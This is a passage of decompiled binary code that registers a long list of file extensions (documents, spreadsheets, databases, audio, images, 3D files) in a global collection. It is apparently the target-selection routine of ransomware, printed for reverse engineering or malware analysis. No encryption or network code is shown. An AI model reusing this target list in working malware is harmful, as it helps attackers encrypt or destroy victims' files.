  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v25 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v26 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v26 >= Block[0] || (unsigned int)(Block[0] - v26) < 4 || (unsigned int)(Block[0] - v26) > 0x23 )
        goto LABEL_388;
      v25 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v25);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "docm", 4u);
  v209 = 11;
  sub_40C7C0(&dword_45384C, (int)v207, v27, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v28 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v29 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v29 >= Block[0] || (unsigned int)(Block[0] - v29) < 4 || (unsigned int)(Block[0] - v29) > 0x23 )
        goto LABEL_388;
      v28 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v28);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "docp", 4u);
  v209 = 12;
  sub_40C7C0(&dword_45384C, (int)v207, v30, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v31 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v32 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v32 >= Block[0] || (unsigned int)(Block[0] - v32) < 4 || (unsigned int)(Block[0] - v32) > 0x23 )
        goto LABEL_388;
      v31 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v31);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "msg", 3u);
  v209 = 13;
  sub_40C7C0(&dword_45384C, (int)v207, v33, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v34 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v35 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v35 >= Block[0] || (unsigned int)(Block[0] - v35) < 4 || (unsigned int)(Block[0] - v35) > 0x23 )
        goto LABEL_388;
      v34 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v34);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "pages", 5u);
  v209 = 14;
  sub_40C7C0(&dword_45384C, (int)v207, v36, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v37 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v38 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v38 >= Block[0] || (unsigned int)(Block[0] - v38) < 4 || (unsigned int)(Block[0] - v38) > 0x23 )
        goto LABEL_388;
      v37 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v37);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "wpd", 3u);
  v209 = 15;
  sub_40C7C0(&dword_45384C, (int)v207, v39, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v40 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v41 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v41 >= Block[0] || (unsigned int)(Block[0] - v41) < 4 || (unsigned int)(Block[0] - v41) > 0x23 )
        goto LABEL_388;
      v40 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v40);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "wps", 3u);
  v209 = 16;
  sub_40C7C0(&dword_45384C, (int)v207, v42, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v43 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v44 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v44 >= Block[0] || (unsigned int)(Block[0] - v44) < 4 || (unsigned int)(Block[0] - v44) > 0x23 )
        goto LABEL_388;
      v43 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v43);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "text", 4u);
  v209 = 17;
  sub_40C7C0(&dword_45384C, (int)v207, v45, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v46 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v47 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v47 >= Block[0] || (unsigned int)(Block[0] - v47) < 4 || (unsigned int)(Block[0] - v47) > 0x23 )
        goto LABEL_388;
      v46 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v46);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "dif", 3u);
  v209 = 18;
  sub_40C7C0(&dword_45384C, (int)v207, v48, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v49 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v50 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v50 >= Block[0] || (unsigned int)(Block[0] - v50) < 4 || (unsigned int)(Block[0] - v50) > 0x23 )
        goto LABEL_388;
      v49 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v49);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "odg", 3u);
  v209 = 19;
  sub_40C7C0(&dword_45384C, (int)v207, v51, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v52 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v53 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v53 >= Block[0] || (unsigned int)(Block[0] - v53) < 4 || (unsigned int)(Block[0] - v53) > 0x23 )
        goto LABEL_388;
      v52 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v52);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "123", 3u);
  v209 = 20;
  sub_40C7C0(&dword_45384C, (int)v207, v54, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v55 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v56 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v56 >= Block[0] || (unsigned int)(Block[0] - v56) < 4 || (unsigned int)(Block[0] - v56) > 0x23 )
        goto LABEL_388;
      v55 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v55);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "xls", 3u);
  v209 = 21;
  sub_40C7C0(&dword_45384C, (int)v207, v57, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v58 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v59 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v59 >= Block[0] || (unsigned int)(Block[0] - v59) < 4 || (unsigned int)(Block[0] - v59) > 0x23 )
        goto LABEL_388;
      v58 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v58);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "doc", 3u);
  v209 = 22;
  sub_40C7C0(&dword_45384C, (int)v207, v60, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v61 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v62 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v62 >= Block[0] || (unsigned int)(Block[0] - v62) < 4 || (unsigned int)(Block[0] - v62) > 0x23 )
        goto LABEL_388;
      v61 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v61);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "xlsx", 4u);
  v209 = 23;
  sub_40C7C0(&dword_45384C, (int)v207, v63, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v64 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v65 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v65 >= Block[0] || (unsigned int)(Block[0] - v65) < 4 || (unsigned int)(Block[0] - v65) > 0x23 )
        goto LABEL_388;
      v64 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v64);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "xlm", 3u);
  v209 = 24;
  sub_40C7C0(&dword_45384C, (int)v207, v66, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v67 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v68 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v68 >= Block[0] || (unsigned int)(Block[0] - v68) < 4 || (unsigned int)(Block[0] - v68) > 0x23 )
        goto LABEL_388;
      v67 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v67);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "xlsb", 4u);
  v209 = 25;
  sub_40C7C0(&dword_45384C, (int)v207, v69, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v70 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v71 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v71 >= Block[0] || (unsigned int)(Block[0] - v71) < 4 || (unsigned int)(Block[0] - v71) > 0x23 )
        goto LABEL_388;
      v70 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v70);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "xlsm", 4u);
  v209 = 26;
  sub_40C7C0(&dword_45384C, (int)v207, v72, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v73 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v74 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v74 >= Block[0] || (unsigned int)(Block[0] - v74) < 4 || (unsigned int)(Block[0] - v74) > 0x23 )
        goto LABEL_388;
      v73 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v73);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "docx", 4u);
  v209 = 27;
  sub_40C7C0(&dword_45384C, (int)v207, v75, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v76 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v77 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v77 >= Block[0] || (unsigned int)(Block[0] - v77) < 4 || (unsigned int)(Block[0] - v77) > 0x23 )
        goto LABEL_388;
      v76 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v76);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "rtf", 3u);
  v209 = 28;
  sub_40C7C0(&dword_45384C, (int)v207, v78, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v79 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v80 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v80 >= Block[0] || (unsigned int)(Block[0] - v80) < 4 || (unsigned int)(Block[0] - v80) > 0x23 )
        goto LABEL_388;
      v79 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v79);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "xml", 3u);
  v209 = 29;
  sub_40C7C0(&dword_45384C, (int)v207, v81, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v82 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v83 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v83 >= Block[0] || (unsigned int)(Block[0] - v83) < 4 || (unsigned int)(Block[0] - v83) > 0x23 )
        goto LABEL_388;
      v82 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v82);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "odt", 3u);
  v209 = 30;
  sub_40C7C0(&dword_45384C, (int)v207, v84, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v85 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v86 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v86 >= Block[0] || (unsigned int)(Block[0] - v86) < 4 || (unsigned int)(Block[0] - v86) > 0x23 )
        goto LABEL_388;
      v85 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v85);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "pdf", 3u);
  v209 = 31;
  sub_40C7C0(&dword_45384C, (int)v207, v87, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v88 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v89 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v89 >= Block[0] || (unsigned int)(Block[0] - v89) < 4 || (unsigned int)(Block[0] - v89) > 0x23 )
        goto LABEL_388;
      v88 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v88);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "cdr", 3u);
  v209 = 32;
  sub_40C7C0(&dword_45384C, (int)v207, v90, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v91 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v92 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v92 >= Block[0] || (unsigned int)(Block[0] - v92) < 4 || (unsigned int)(Block[0] - v92) > 0x23 )
        goto LABEL_388;
      v91 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v91);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "cd", 2u);
  v209 = 33;
  sub_40C7C0(&dword_45384C, (int)v207, v93, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v94 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v95 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v95 >= Block[0] || (unsigned int)(Block[0] - v95) < 4 || (unsigned int)(Block[0] - v95) > 0x23 )
        goto LABEL_388;
      v94 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v94);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "1cd", 3u);
  v209 = 34;
  sub_40C7C0(&dword_45384C, (int)v207, v96, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v97 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v98 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v98 >= Block[0] || (unsigned int)(Block[0] - v98) < 4 || (unsigned int)(Block[0] - v98) > 0x23 )
        goto LABEL_388;
      v97 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v97);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "sqlite", 6u);
  v209 = 35;
  sub_40C7C0(&dword_45384C, (int)v207, v99, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v100 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v101 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v101 >= Block[0] || (unsigned int)(Block[0] - v101) < 4 || (unsigned int)(Block[0] - v101) > 0x23 )
        goto LABEL_388;
      v100 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v100);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "wav", 3u);
  v209 = 36;
  sub_40C7C0(&dword_45384C, (int)v207, v102, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v103 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v104 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v104 >= Block[0] || (unsigned int)(Block[0] - v104) < 4 || (unsigned int)(Block[0] - v104) > 0x23 )
        goto LABEL_388;
      v103 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v103);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "mp3", 3u);
  v209 = 37;
  sub_40C7C0(&dword_45384C, (int)v207, v105, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v106 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v107 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v107 >= Block[0] || (unsigned int)(Block[0] - v107) < 4 || (unsigned int)(Block[0] - v107) > 0x23 )
        goto LABEL_388;
      v106 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v106);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "wma", 3u);
  v209 = 38;
  sub_40C7C0(&dword_45384C, (int)v207, v108, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v109 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v110 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v110 >= Block[0] || (unsigned int)(Block[0] - v110) < 4 || (unsigned int)(Block[0] - v110) > 0x23 )
        goto LABEL_388;
      v109 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v109);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "ogg", 3u);
  v209 = 39;
  sub_40C7C0(&dword_45384C, (int)v207, v111, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v112 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v113 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v113 >= Block[0] || (unsigned int)(Block[0] - v113) < 4 || (unsigned int)(Block[0] - v113) > 0x23 )
        goto LABEL_388;
      v112 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v112);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "aif", 3u);
  v209 = 40;
  sub_40C7C0(&dword_45384C, (int)v207, v114, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v115 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v116 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v116 >= Block[0] || (unsigned int)(Block[0] - v116) < 4 || (unsigned int)(Block[0] - v116) > 0x23 )
        goto LABEL_388;
      v115 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v115);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "iff", 3u);
  v209 = 41;
  sub_40C7C0(&dword_45384C, (int)v207, v117, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v118 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v119 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v119 >= Block[0] || (unsigned int)(Block[0] - v119) < 4 || (unsigned int)(Block[0] - v119) > 0x23 )
        goto LABEL_388;
      v118 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v118);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "m3u", 3u);
  v209 = 42;
  sub_40C7C0(&dword_45384C, (int)v207, v120, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v121 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v122 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v122 >= Block[0] || (unsigned int)(Block[0] - v122) < 4 || (unsigned int)(Block[0] - v122) > 0x23 )
        goto LABEL_388;
      v121 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v121);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "m4a", 3u);
  v209 = 43;
  sub_40C7C0(&dword_45384C, (int)v207, v123, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v124 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v125 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v125 >= Block[0] || (unsigned int)(Block[0] - v125) < 4 || (unsigned int)(Block[0] - v125) > 0x23 )
        goto LABEL_388;
      v124 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v124);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "mid", 3u);
  v209 = 44;
  sub_40C7C0(&dword_45384C, (int)v207, v126, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v127 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v128 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v128 >= Block[0] || (unsigned int)(Block[0] - v128) < 4 || (unsigned int)(Block[0] - v128) > 0x23 )
        goto LABEL_388;
      v127 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v127);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "mpa", 3u);
  v209 = 45;
  sub_40C7C0(&dword_45384C, (int)v207, v129, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v130 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v131 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v131 >= Block[0] || (unsigned int)(Block[0] - v131) < 4 || (unsigned int)(Block[0] - v131) > 0x23 )
        goto LABEL_388;
      v130 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v130);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "obj", 3u);
  v209 = 46;
  sub_40C7C0(&dword_45384C, (int)v207, v132, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v133 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v134 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v134 >= Block[0] || (unsigned int)(Block[0] - v134) < 4 || (unsigned int)(Block[0] - v134) > 0x23 )
        goto LABEL_388;
      v133 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v133);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "max", 3u);
  v209 = 47;
  sub_40C7C0(&dword_45384C, (int)v207, v135, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v136 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v137 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v137 >= Block[0] || (unsigned int)(Block[0] - v137) < 4 || (unsigned int)(Block[0] - v137) > 0x23 )
        goto LABEL_388;
      v136 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v136);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "3dm", 3u);
  v209 = 48;
  sub_40C7C0(&dword_45384C, (int)v207, v138, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
  {
    v139 = Block[0];
    if ( v206 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_388;
      v140 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v140 >= Block[0] || (unsigned int)(Block[0] - v140) < 4 || (unsigned int)(Block[0] - v140) > 0x23 )
        goto LABEL_388;
      v139 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v139);
  }
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "3ds", 3u);
  v209 = 49;
  sub_40C7C0(&dword_45384C, (int)v207, v141, Block, v208);
  v209 = -1;
  if ( v206 < 0x10 )
    goto LABEL_385;
  v142 = Block[0];
  if ( v206 + 1 >= 0x1000 )
  {
    if ( ((int)Block[0] & 0x1F) == 0 )
    {
      v143 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v143 < Block[0] && (unsigned int)(Block[0] - v143) >= 4 && (unsigned int)(Block[0] - v143) <= 0x23 )
      {
        v142 = (void *)*((_DWORD *)Block[0] - 1);
        goto LABEL_384;
      }
    }
LABEL_388:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_384:
  j__free(v142);
LABEL_385:
  v205 = 0;
  v206 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "dbf", 3u);
  v209 = 50;
  sub_40C7C0(&dword_45384C, (int)v207, v144, Block, v208);
  v209 = -1;
  if ( v206 >= 0x10 )
    sub_401CD0((_DWORD *)Block[0], v206 + 1);
  sub_4019D0((char **)Block, "accdb");
  v209 = 51;
  sub_40C390(&dword_45384C, (int)v207, Block);
  v209 = -1;
  sub_401970((char **)Block);
  sub_4019D0((char **)Block, "db");
  v209 = 52;
  sub_40C390(&dword_45384C, (int)v207, Block);
  v209 = -1;
  sub_401970((char **)Block);
  sub_4019D0((char **)Block, "dbf");
  v209 = 53;
  sub_40C390(&dword_45384C, (int)v207, Block);
  v209 = -1;
  sub_401970((char **)Block);
  sub_4019D0((char **)Block, "sql");
  v209 = 54;
  sub_40C390(&dword_45384C, (int)v207, Block);
  v209 = -1;
  sub_401970((char **)Block);
  sub_4019D0((char **)Block, "pdb");
  v209 = 55;
  sub_40C390(&dword_45384C, (int)v207, Block);
  v209 = -1;
  sub_401970((char **)Block);
  sub_4019D0((char **)Block, "mdb");
  v209 = 56;
  sub_40C390(&dword_45384C, (int)v207, Block);
  v209 = -1;
  sub_401970((char **)Block);
  sub_4019D0((char **)Block, "wsf");
  v209 = 57;
  sub_40C390(&dword_45384C, (int)v207, Block);
  v209 = -1;
  sub_401970((char **)Block);
  sub_4019D0((char **)Block, "apk");
  v209 = 58;
  sub_40C390(&dword_45384C, (int)v207, Block);
  v209 = -1;
  sub_401970((char **)Block);
  sub_4019D0((char **)Block, "com");
  v209 = 59;
  sub_40C390(&dword_45384C, (int)v207, Block);
  v209 = -1;
  sub_401970((char **)Block);
  sub_4019D0((char **)Block, "gadget");
  v209 = 60;
  sub_40C390(&dword_45384C, (int)v207, Block);
  v209 = -1;
  sub_401970((char **)Block);
  sub_4019D0((char **)Block, "torrent");
  v209 = 61;
  sub_40C390(&dword_45384C, (int)v207, Block);
  v209 = -1;
  sub_401970((char **)Block);
  sub_4019D0((char **)Block, "jpg");
  v209 = 62;
  sub_40C390(&dword_45384C, (int)v207, Block);
  v209 = -1;
  sub_401970((char **)Block);
  sub_4019D0((char **)Block, "jpeg");
  v209 = 63;
